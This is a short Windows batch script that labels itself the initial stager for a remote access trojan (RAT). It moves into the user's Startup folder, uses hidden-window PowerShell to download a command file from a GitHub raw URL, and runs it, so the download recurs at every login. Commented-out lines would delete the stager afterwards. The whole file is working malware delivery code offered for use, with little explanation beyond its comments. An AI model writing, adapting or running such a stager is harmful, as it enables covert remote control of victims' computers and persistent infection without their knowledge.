
@echo off
@REM initial stager for RAT
@REM created by : Luke O'Sullivan

@REM variables
set "initialPath=%cd%"
set "STARTUP=%C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup%"
@REM move into startup directory
cd %STARTUP%
@REM writeS payload to startup
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/wget.cmd -OutFile wget.cmd"


@REM run payload placeholder
powershell ./wget.cmd


@REM cd %initialPath%
@REM del init.cmd
